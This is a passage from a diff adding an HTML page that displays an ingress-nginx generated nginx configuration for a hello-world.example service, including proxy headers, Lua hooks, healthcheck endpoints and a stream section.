+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">listen</span> <span style="color:#ae81ff">80</span>  ;
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">listen</span> <span style="color:#e6db74">[::]:80</span>  ;
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">listen</span> <span style="color:#ae81ff">443</span>  <span style="color:#e6db74">ssl</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">listen</span> <span style="color:#e6db74">[::]:443</span>  <span style="color:#e6db74">ssl</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">set</span> $proxy_upstream_name <span style="color:#e6db74">&#34;-&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">ssl_certificate_by_lua_block</span> {
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">certificate.call()</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#960050;background-color:#1e0010">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">location</span> <span style="color:#e6db74">/</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">set</span> $namespace      <span style="color:#e6db74">&#34;default&#34;</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">set</span> $ingress_name   <span style="color:#e6db74">&#34;example-ingress&#34;</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">set</span> $service_name   <span style="color:#e6db74">&#34;web&#34;</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">set</span> $service_port   <span style="color:#e6db74">&#34;5678&#34;</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">set</span> $location_path  <span style="color:#e6db74">&#34;/&#34;</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">set</span> $global_rate_limit_exceeding <span style="color:#e6db74">n</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">rewrite_by_lua_block</span> {
+</span></span><span style="display:flex;"><span>                                <span style="color:#f92672">lua_ingress.rewrite({</span>
+</span></span><span style="display:flex;"><span>                                        <span style="color:#e6db74">force_ssl_redirect</span> = <span style="color:#e6db74">false,</span>
+</span></span><span style="display:flex;"><span>                                        <span style="color:#e6db74">ssl_redirect</span> = <span style="color:#e6db74">true,</span>
+</span></span><span style="display:flex;"><span>                                        <span style="color:#e6db74">force_no_ssl_redirect</span> = <span style="color:#e6db74">false,</span>
+</span></span><span style="display:flex;"><span>                                        <span style="color:#e6db74">preserve_trailing_slash</span> = <span style="color:#e6db74">false,</span>
+</span></span><span style="display:flex;"><span>                                        <span style="color:#e6db74">use_port_in_redirects</span> = <span style="color:#e6db74">false,</span>
+</span></span><span style="display:flex;"><span>                                        <span style="color:#e6db74">global_throttle</span> = { <span style="color:#f92672">namespace</span> = <span style="color:#e6db74">&#34;&#34;,</span> <span style="color:#e6db74">limit</span> = <span style="color:#ae81ff">0</span><span style="color:#e6db74">,</span> <span style="color:#e6db74">window_size</span> = <span style="color:#ae81ff">0</span><span style="color:#e6db74">,</span> <span style="color:#e6db74">key</span> = { }<span style="color:#f92672">,</span> <span style="color:#e6db74">ignored_cidrs</span> = { } }<span style="color:#f92672">,</span>
+</span></span><span style="display:flex;"><span>                                <span style="color:#960050;background-color:#1e0010">}</span><span style="color:#e6db74">)</span>
+</span></span><span style="display:flex;"><span>                                <span style="color:#e6db74">balancer.rewrite()</span>
+</span></span><span style="display:flex;"><span>                                <span style="color:#e6db74">plugins.run()</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#960050;background-color:#1e0010">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#75715e"># be careful with `access_by_lua_block` and `satisfy any` directives as satisfy any
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                        <span style="color:#75715e"># will always succeed when there&#39;s `access_by_lua_block` that does not have any lua code doing `ngx.exit(ngx.DECLINED)`
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                        <span style="color:#75715e"># other authentication method such as basic auth or external auth useless - all requests will be allowed.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                        <span style="color:#75715e">#access_by_lua_block {
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                        <span style="color:#75715e">#}
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">header_filter_by_lua_block</span> {
+</span></span><span style="display:flex;"><span>                                <span style="color:#f92672">lua_ingress.header()</span>
+</span></span><span style="display:flex;"><span>                                <span style="color:#e6db74">plugins.run()</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#960050;background-color:#1e0010">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">body_filter_by_lua_block</span> {
+</span></span><span style="display:flex;"><span>                                <span style="color:#f92672">plugins.run()</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#960050;background-color:#1e0010">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">log_by_lua_block</span> {
+</span></span><span style="display:flex;"><span>                                <span style="color:#f92672">balancer.log()</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                                <span style="color:#e6db74">monitor.call()</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                                <span style="color:#e6db74">plugins.run()</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#960050;background-color:#1e0010">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">port_in_redirect</span> <span style="color:#66d9ef">off</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">set</span> $balancer_ewma_score <span style="color:#e6db74">-1</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">set</span> $proxy_upstream_name <span style="color:#e6db74">&#34;default-web-5678&#34;</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">set</span> $proxy_host          $proxy_upstream_name;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">set</span> $pass_access_scheme  $scheme;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">set</span> $pass_server_port    $server_port;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">set</span> $best_http_host      $http_host;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">set</span> $pass_port           $pass_server_port;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">set</span> $proxy_alternative_upstream_name <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">client_max_body_size</span>                    <span style="color:#ae81ff">1m</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_set_header</span> <span style="color:#e6db74">Host</span>                   $best_http_host;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#75715e"># Pass the extracted client certificate to the backend
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#75715e"># Allow websocket connections
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                        <span style="color:#f92672">proxy_set_header</span>                        <span style="color:#e6db74">Upgrade</span>           $http_upgrade;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_set_header</span>                        <span style="color:#e6db74">Connection</span>        $connection_upgrade;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_set_header</span> <span style="color:#e6db74">X-Request-ID</span>           $req_id;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_set_header</span> <span style="color:#e6db74">X-Real-IP</span>              $remote_addr;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_set_header</span> <span style="color:#e6db74">X-Forwarded-For</span>        $remote_addr;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_set_header</span> <span style="color:#e6db74">X-Forwarded-Host</span>       $best_http_host;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_set_header</span> <span style="color:#e6db74">X-Forwarded-Port</span>       $pass_port;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_set_header</span> <span style="color:#e6db74">X-Forwarded-Proto</span>      $pass_access_scheme;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_set_header</span> <span style="color:#e6db74">X-Forwarded-Scheme</span>     $pass_access_scheme;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_set_header</span> <span style="color:#e6db74">X-Scheme</span>               $pass_access_scheme;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#75715e"># Pass the original X-Forwarded-For
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                        <span style="color:#f92672">proxy_set_header</span> <span style="color:#e6db74">X-Original-Forwarded-For</span> $http_x_forwarded_for;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#75715e"># mitigate HTTPoxy Vulnerability
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                        <span style="color:#75715e"># https://www.nginx.com/blog/mitigating-the-httpoxy-vulnerability-with-nginx/
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                        <span style="color:#f92672">proxy_set_header</span> <span style="color:#e6db74">Proxy</span>                  <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#75715e"># Custom headers to proxied server
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_connect_timeout</span>                   <span style="color:#e6db74">5s</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_send_timeout</span>                      <span style="color:#e6db74">60s</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_read_timeout</span>                      <span style="color:#e6db74">60s</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_buffering</span>                         <span style="color:#66d9ef">off</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_buffer_size</span>                       <span style="color:#ae81ff">4k</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_buffers</span>                           <span style="color:#ae81ff">4</span> <span style="color:#ae81ff">4k</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_max_temp_file_size</span>                <span style="color:#ae81ff">1024m</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_request_buffering</span>                 <span style="color:#66d9ef">on</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_http_version</span>                      <span style="color:#ae81ff">1</span><span style="color:#e6db74">.1</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_cookie_domain</span>                     <span style="color:#66d9ef">off</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_cookie_path</span>                       <span style="color:#66d9ef">off</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#75715e"># In case of errors try the next upstream server before returning an error
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                        <span style="color:#f92672">proxy_next_upstream</span>                     <span style="color:#e6db74">error</span> <span style="color:#e6db74">timeout</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_next_upstream_timeout</span>             <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_next_upstream_tries</span>               <span style="color:#ae81ff">3</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_pass</span> <span style="color:#e6db74">http://upstream_balancer</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_redirect</span>                          <span style="color:#66d9ef">off</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">## end server hello-world.example
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># backend for when default-backend-service is not configured or it does not have endpoints
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#f92672">server</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">listen</span> <span style="color:#ae81ff">8181</span> <span style="color:#e6db74">default_server</span> <span style="color:#e6db74">reuseport</span> <span style="color:#e6db74">backlog=4096</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">listen</span> <span style="color:#e6db74">[::]:8181</span> <span style="color:#e6db74">default_server</span> <span style="color:#e6db74">reuseport</span> <span style="color:#e6db74">backlog=4096</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">set</span> $proxy_upstream_name <span style="color:#e6db74">&#34;internal&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">access_log</span> <span style="color:#66d9ef">off</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">location</span> <span style="color:#e6db74">/</span> {
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">return</span> <span style="color:#ae81ff">404</span>;
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># default server, used for NGINX healthcheck and access to nginx stats
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#f92672">server</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># Ensure that modsecurity will not run on an internal location as this is not accessible from outside
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">listen</span> 127.0.0.1:<span style="color:#ae81ff">10246</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">set</span> $proxy_upstream_name <span style="color:#e6db74">&#34;internal&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">keepalive_timeout</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">gzip</span> <span style="color:#66d9ef">off</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">access_log</span> <span style="color:#66d9ef">off</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">location</span> <span style="color:#e6db74">/healthz</span> {
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">return</span> <span style="color:#ae81ff">200</span>;
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">location</span> <span style="color:#e6db74">/is-dynamic-lb-initialized</span> {
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">content_by_lua_block</span> {
+</span></span><span style="display:flex;"><span>                                <span style="color:#f92672">local</span> <span style="color:#e6db74">configuration</span> = <span style="color:#e6db74">require(&#34;configuration&#34;)</span>
+</span></span><span style="display:flex;"><span>                                <span style="color:#e6db74">local</span> <span style="color:#e6db74">backend_data</span> = <span style="color:#e6db74">configuration.get_backends_data()</span>
+</span></span><span style="display:flex;"><span>                                <span style="color:#e6db74">if</span> <span style="color:#e6db74">not</span> <span style="color:#e6db74">backend_data</span> <span style="color:#e6db74">then</span>
+</span></span><span style="display:flex;"><span>                                <span style="color:#e6db74">ngx.exit(ngx.HTTP_INTERNAL_SERVER_ERROR)</span>
+</span></span><span style="display:flex;"><span>                                <span style="color:#e6db74">return</span>
+</span></span><span style="display:flex;"><span>                                <span style="color:#e6db74">end</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                                <span style="color:#e6db74">ngx.say(&#34;OK&#34;)</span>
+</span></span><span style="display:flex;"><span>                                <span style="color:#e6db74">ngx.exit(ngx.HTTP_OK)</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#960050;background-color:#1e0010">}</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#960050;background-color:#1e0010">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">location</span> <span style="color:#e6db74">/nginx_status</span> {
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">stub_status</span> <span style="color:#66d9ef">on</span>;
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">location</span> <span style="color:#e6db74">/configuration</span> {
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">client_max_body_size</span>                    <span style="color:#e6db74">21M</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">client_body_buffer_size</span>                 <span style="color:#e6db74">21M</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_buffering</span>                         <span style="color:#66d9ef">off</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">content_by_lua_block</span> {
+</span></span><span style="display:flex;"><span>                                <span style="color:#f92672">configuration.call()</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#960050;background-color:#1e0010">}</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#960050;background-color:#1e0010">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">location</span> <span style="color:#e6db74">/</span> {
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">content_by_lua_block</span> {
+</span></span><span style="display:flex;"><span>                                <span style="color:#f92672">ngx.exit(ngx.HTTP_NOT_FOUND)</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#960050;background-color:#1e0010">}</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#960050;background-color:#1e0010">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#960050;background-color:#1e0010">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">stream</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">lua_package_path</span> <span style="color:#e6db74">&#34;/etc/nginx/lua/?.lua</span>;<span style="color:#f92672">/etc/nginx/lua/vendor/?.lua</span>;;<span style="color:#f92672">&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">lua_shared_dict</span> <span style="color:#e6db74">tcp_udp_configuration_data</span> <span style="color:#e6db74">5M</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">resolver</span> <span style="color:#ae81ff">10</span><span style="color:#e6db74">.96.0.10</span> <span style="color:#e6db74">valid=30s</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">init_by_lua_block</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">collectgarbage(&#34;collect&#34;)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">--</span> <span style="color:#e6db74">init</span> <span style="color:#e6db74">modules</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">local</span> <span style="color:#e6db74">ok,</span> <span style="color:#e6db74">res</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">ok,</span> <span style="color:#e6db74">res</span> = <span style="color:#e6db74">pcall(require,</span> <span style="color:#e6db74">&#34;configuration&#34;)</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">if</span> <span style="color:#e6db74">not</span> <span style="color:#e6db74">ok</span> <span style="color:#e6db74">then</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">error(&#34;require</span> <span style="color:#e6db74">failed:</span> <span style="color:#e6db74">&#34;</span> <span style="color:#e6db74">..</span> <span style="color:#e6db74">tostring(res))</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">else</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">configuration</span> = <span style="color:#e6db74">res</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">end</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">ok,</span> <span style="color:#e6db74">res</span> = <span style="color:#e6db74">pcall(require,</span> <span style="color:#e6db74">&#34;tcp_udp_configuration&#34;)</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">if</span> <span style="color:#e6db74">not</span> <span style="color:#e6db74">ok</span> <span style="color:#e6db74">then</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">error(&#34;require</span> <span style="color:#e6db74">failed:</span> <span style="color:#e6db74">&#34;</span> <span style="color:#e6db74">..</span> <span style="color:#e6db74">tostring(res))</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">else</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">tcp_udp_configuration</span> = <span style="color:#e6db74">res</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">tcp_udp_configuration.prohibited_localhost_port</span> = <span style="color:#e6db74">&#39;10246&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">end</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">ok,</span> <span style="color:#e6db74">res</span> = <span style="color:#e6db74">pcall(require,</span> <span style="color:#e6db74">&#34;tcp_udp_balancer&#34;)</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">if</span> <span style="color:#e6db74">not</span> <span style="color:#e6db74">ok</span> <span style="color:#e6db74">then</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">error(&#34;require</span> <span style="color:#e6db74">failed:</span> <span style="color:#e6db74">&#34;</span> <span style="color:#e6db74">..</span> <span style="color:#e6db74">tostring(res))</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">else</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">tcp_udp_balancer</span> = <span style="color:#e6db74">res</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">end</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#960050;background-color:#1e0010">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">init_worker_by_lua_block</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">tcp_udp_balancer.init_worker()</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#960050;background-color:#1e0010">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">lua_add_variable</span> $proxy_upstream_name;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">log_format</span> <span style="color:#e6db74">log_stream</span> <span style="color:#e6db74">&#39;[</span>$remote_addr] <span style="color:#e6db74">[</span>$time_local] $protocol $status $bytes_sent $bytes_received $session_time&#39;;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">access_log</span> <span style="color:#e6db74">/var/log/nginx/access.log</span> <span style="color:#e6db74">log_stream</span> ;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">error_log</span>  <span style="color:#e6db74">/var/log/nginx/error.log</span> <span style="color:#e6db74">notice</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">upstream</span> <span style="color:#e6db74">upstream_balancer</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">server</span> 0.0.0.1:<span style="color:#ae81ff">1234</span>; <span style="color:#75715e"># placeholder
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">balancer_by_lua_block</span> {
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">tcp_udp_balancer.balance()</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#960050;background-color:#1e0010">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#960050;background-color:#1e0010">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">server</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">listen</span> 127.0.0.1:<span style="color:#ae81ff">10247</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">access_log</span> <span style="color:#66d9ef">off</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">content_by_lua_block</span> {
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">tcp_udp_configuration.call()</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#960050;background-color:#1e0010">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#960050;background-color:#1e0010">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># TCP services
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># UDP services
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Stream Snippets
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}</span>
+</span></span></code></pre></div></div></article>
+<footer class="py:24">
+    <div class="f:fade-30 f:14 mb:8"></div>
+</footer></div>
+    </div>
+</body>
+
+</html>
